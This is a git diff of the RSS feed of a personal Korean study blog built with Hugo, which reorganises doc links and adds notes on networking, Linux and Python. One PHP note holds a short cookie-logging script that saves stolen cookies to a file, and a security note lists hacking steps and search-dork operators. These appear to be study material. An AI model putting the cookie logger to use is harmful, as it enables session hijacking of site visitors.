@@ -6,47 +6,26 @@
     <description>Recent content in Home on 왈왈왈</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 28 Sep 2014 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 02 Apr 2014 00:00:00 +0000</lastBuildDate>
     
 	<atom:link href="https://mung0001.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
-      <title>테스트2</title>
-      <link>https://mung0001.github.io/posts/creating-a-new-theme/</link>
-      <pubDate>Sun, 28 Sep 2014 00:00:00 +0000</pubDate>
-      
-      <guid>https://mung0001.github.io/posts/creating-a-new-theme/</guid>
-      <description>Introduction This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&amp;rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&amp;rsquo;t cover using CSS to style your theme.
-We&amp;rsquo;ll start with creating a new site with a very basic template.</description>
-    </item>
-    
-    <item>
-      <title>테스트4</title>
-      <link>https://mung0001.github.io/posts/migrate-from-jekyll/</link>
-      <pubDate>Mon, 10 Mar 2014 00:00:00 +0000</pubDate>
-      
-      <guid>https://mung0001.github.io/posts/migrate-from-jekyll/</guid>
-      <description>Yes I can!! print(&amp;#34;그만~하자~&amp;#34;)print(&amp;#34;그만~하자~&amp;#34;)Move static content to static Jekyll has a rule that any directory not starting with _ will be copied as-is to the _site output. Hugo keeps all static content under static. You should therefore move it all there. With Jekyll, something that looked like
-▾ &amp;lt;root&amp;gt;/▾ images/logo.png should become
-▾ &amp;lt;root&amp;gt;/▾ static/▾ images/logo.png Additionally, you&amp;rsquo;ll want any files that should reside at the root (such as CNAME) to be moved to static.</description>
-    </item>
-    
-    <item>
       <title></title>
-      <link>https://mung0001.github.io/docs/%ED%95%A8%EC%88%98%EC%A0%95%EB%A6%AC/java/</link>
+      <link>https://mung0001.github.io/docs/programing/java/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://mung0001.github.io/docs/%ED%95%A8%EC%88%98%EC%A0%95%EB%A6%AC/java/</guid>
+      <guid>https://mung0001.github.io/docs/programing/java/</guid>
       <description>Java ****  ...</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://mung0001.github.io/docs/%ED%95%A8%EC%88%98%EC%A0%95%EB%A6%AC/php/</link>
+      <link>https://mung0001.github.io/docs/programing/php/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://mung0001.github.io/docs/%ED%95%A8%EC%88%98%EC%A0%95%EB%A6%AC/php/</guid>
+      <guid>https://mung0001.github.io/docs/programing/php/</guid>
       <description>PHP ID, PW EX...&amp;lt;?php$cookie=$_GET[&amp;#34;data&amp;#34;];$myfile=fopen(&amp;#34;cookie/data.txt&amp;#34;, &amp;#34;a+&amp;#34;);fwrite($myfile, $cookie.&amp;#34;\r\n&amp;#34;);fclose($myfile);?&amp;gt;</description>
     </item>
     
@@ -61,17 +40,50 @@ This document is a brief primer on using Go templates.</description>
     </item>
     
     <item>
-      <title>테스트3</title>
-      <link>https://mung0001.github.io/posts/hugoisforlovers/</link>
-      <pubDate>Wed, 02 Apr 2014 00:00:00 +0000</pubDate>
+      <title></title>
+      <link>https://mung0001.github.io/docs/basic/network/network_equipment/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://mung0001.github.io/posts/hugoisforlovers/</guid>
-      <description>Step 1. Install Hugo Go to Hugo releases and download the appropriate version for your OS and architecture.
-Save it somewhere specific as we will be using it in the next step.
-More complete instructions are available at Install Hugo
-Step 2. Build the Docs Hugo has its own example site which happens to also be the documentation site you are reading right now.
-Follow the following steps:
- Clone the Hugo repository Go into the repo Run hugo in server mode and build the docs Open your browser to http://localhost:1313  Corresponding pseudo commands:</description>
+      <guid>https://mung0001.github.io/docs/basic/network/network_equipment/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://mung0001.github.io/docs/basic/network/%E3%84%B4-packet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://mung0001.github.io/docs/basic/network/%E3%84%B4-packet/</guid>
+      <description>네트워크 패킷 ( Network Packet )    패킷이란 데이터의 묶음 단위로 한번에 전송할 데이터의 크기
+  제 3계층 이상 ( Network 계층 ) 에서는 이 데이터의 묶음을 패킷이라고 부르며, 제 2계층에서는 프레임( Frame )
+  패킷의 크기는 네트워크의 종류에 따라 크기가 다름
+  패킷을 이렇게 나눠 보내는 이유는 컴퓨터는 동시다발적으로 데이터를 전송하는 데, 한 데이터에게만 데이터를 줄 경우, 한 컴퓨터와의 통신밖에 하지 못하기에, 데이터를 나눠 모두에게 통신할 수 있게 하며, 중간에 에러가 날 경우를 대비</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://mung0001.github.io/docs/basic/network/%E3%84%B4-portnumber/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://mung0001.github.io/docs/basic/network/%E3%84%B4-portnumber/</guid>
+      <description>TCP/ UDP 포트 번호 정리  기본적인 포트번호    Well-known port : 0 ~ 1023
+  Registered port : 1024 ~ 49151
+  Dynamic port : 49152 ~ 65535
+    Port Tables...  Register Port  </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://mung0001.github.io/docs/basic/system/%E3%84%B4linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://mung0001.github.io/docs/basic/system/%E3%84%B4linux/</guid>
+      <description>**Linux 기본 **    유닉스 기반의 컴퓨터 운영체제의 한 종류
+  핀란드 헬싱키 대학의 대학원생 리누스 토발즈 ( Linus Tovalds )가 1991년에 개발
+  윈도우와는 다르게 오픈 소스 ( 소스코드가 공개된 프로그램 ) 운영체제
+  소스코드가 공개되어 있기 때문에 다양한 리눅스 기반의 운영 체제가 존재 ( 구글의 안드로이드도 리눅스를 기반으로 만든 운영체제 )
+  대표적인 리눅스 기관 GNU
+      유닉스 운영체제 종류      Linux의 특징   높은 이식성과 확정성 ( C언어 기반 )</description>
     </item>
     
     <item>
@@ -86,23 +98,14 @@ Follow the following steps:
     
     <item>
       <title></title>
-      <link>https://mung0001.github.io/docs/network/network_equipment/</link>
+      <link>https://mung0001.github.io/docs/programing/python/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://mung0001.github.io/docs/network/network_equipment/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://mung0001.github.io/docs/network/packet/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://mung0001.github.io/docs/network/packet/</guid>
-      <description>네트워크 패킷 ( Network Packet )    패킷이란 데이터의 묶음 단위로 한번에 전송할 데이터의 크기
-  제 3계층 이상 ( Network 계층 ) 에서는 이 데이터의 묶음을 패킷이라고 부르며, 제 2계층에서는 프레임( Frame )
-  패킷의 크기는 네트워크의 종류에 따라 크기가 다름
-  패킷을 이렇게 나눠 보내는 이유는 컴퓨터는 동시다발적으로 데이터를 전송하는 데, 한 데이터에게만 데이터를 줄 경우, 한 컴퓨터와의 통신밖에 하지 못하기에, 데이터를 나눠 모두에게 통신할 수 있게 하며, 중간에 에러가 날 경우를 대비</description>
+      <guid>https://mung0001.github.io/docs/programing/python/</guid>
+      <description>Python 내장함수  ...abs abs(x)는 어떤 숫자를 입력받았을 때, 그 숫자의 절댓값을 돌려주는 함수
+&amp;gt;&amp;gt;&amp;gt; abs(3)3&amp;gt;&amp;gt;&amp;gt; abs(-3)3   all all(x)는 반복 가능한(iterable) 자료형 x를 입력 인수로 받으며 이 x가 모두 참이면 True, 거짓이 하나라도 있으면 False를 반환
+※ 반복 가능한 자료형이란 for문으로 그 값을 출력할 수 있는 것을 의미한다. 리스트, 튜플, 문자열, 딕셔너리, 집합 등이 있다.
+&amp;gt;&amp;gt;&amp;gt; all([1, 2, 3])True&amp;gt;&amp;gt;&amp;gt; all([1, 2, 3, 0])False  any any(x)는 x 중 하나라도 참이 있으면 True를 돌려주고, x가 모두 거짓일 때에만 False를 돌려준다.</description>
     </item>
     
     <item>
@@ -186,10 +189,10 @@ Follow the following steps:
     
     <item>
       <title></title>
-      <link>https://mung0001.github.io/docs/%E3%85%8E%E3%85%8E%E3%85%8E/git/</link>
+      <link>https://mung0001.github.io/docs/%EB%B0%B0%EC%B9%98-%EC%A0%84/git/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://mung0001.github.io/docs/%E3%85%8E%E3%85%8E%E3%85%8E/git/</guid>
+      <guid>https://mung0001.github.io/docs/%EB%B0%B0%EC%B9%98-%EC%A0%84/git/</guid>
       <description>Git&amp;amp;&amp;amp; Github  깃 ( git )    Git 공식 홈페이지 에서 다운로드
   형상 관리 도구 ( Configuration Management Tool )인 분산형 관리 시스템
   무료, 공개소프트웨어 서비스
@@ -200,10 +203,10 @@ Follow the following steps:
     
     <item>
       <title></title>
-      <link>https://mung0001.github.io/docs/%E3%85%8E%E3%85%8E%E3%85%8E/hugo/</link>
+      <link>https://mung0001.github.io/docs/%EB%B0%B0%EC%B9%98-%EC%A0%84/hugo/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://mung0001.github.io/docs/%E3%85%8E%E3%85%8E%E3%85%8E/hugo/</guid>
+      <guid>https://mung0001.github.io/docs/%EB%B0%B0%EC%B9%98-%EC%A0%84/hugo/</guid>
       <description>Hugo  휴고 다운로드
    So cutey
   Hugo는 Go언어를 기반으로 Go 언어를 이용한 프로그램 사용 및 수정
@@ -216,10 +219,10 @@ Follow the following steps:
     
     <item>
       <title></title>
-      <link>https://mung0001.github.io/docs/%E3%85%8E%E3%85%8E%E3%85%8E/%EC%98%81%EC%96%B4/</link>
+      <link>https://mung0001.github.io/docs/%EB%B0%B0%EC%B9%98-%EC%A0%84/%EB%B3%B4%EC%95%88/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://mung0001.github.io/docs/%E3%85%8E%E3%85%8E%E3%85%8E/%EC%98%81%EC%96%B4/</guid>
+      <guid>https://mung0001.github.io/docs/%EB%B0%B0%EC%B9%98-%EC%A0%84/%EB%B3%B4%EC%95%88/</guid>
       <description>Network Security  해킹 프로세스   확인 정보( OS 버전, 응용 프로그램, IP주소, 도메인 )
   정보 수집
   취약점 확인
@@ -228,18 +231,6 @@ Follow the following steps:
   filetype:[검색어] - 특정 파일 확장자로 검색
   site:[검색어] - 특정 도메인 주소 검색
   inurl:[검색어] - URL에 포함된 문자 검색</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://mung0001.github.io/docs/%ED%95%A8%EC%88%98%EC%A0%95%EB%A6%AC/python/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://mung0001.github.io/docs/%ED%95%A8%EC%88%98%EC%A0%95%EB%A6%AC/python/</guid>
-      <description>Python 내장함수  ...abs abs(x)는 어떤 숫자를 입력받았을 때, 그 숫자의 절댓값을 돌려주는 함수
-&amp;gt;&amp;gt;&amp;gt; abs(3)3&amp;gt;&amp;gt;&amp;gt; abs(-3)3   all all(x)는 반복 가능한(iterable) 자료형 x를 입력 인수로 받으며 이 x가 모두 참이면 True, 거짓이 하나라도 있으면 False를 반환
-※ 반복 가능한 자료형이란 for문으로 그 값을 출력할 수 있는 것을 의미한다. 리스트, 튜플, 문자열, 딕셔너리, 집합 등이 있다.
-&amp;gt;&amp;gt;&amp;gt; all([1, 2, 3])True&amp;gt;&amp;gt;&amp;gt; all([1, 2, 3, 0])False  any any(x)는 x 중 하나라도 참이 있으면 True를 돌려주고, x가 모두 거짓일 때에만 False를 돌려준다.</description>
     </item>
     
     <item>
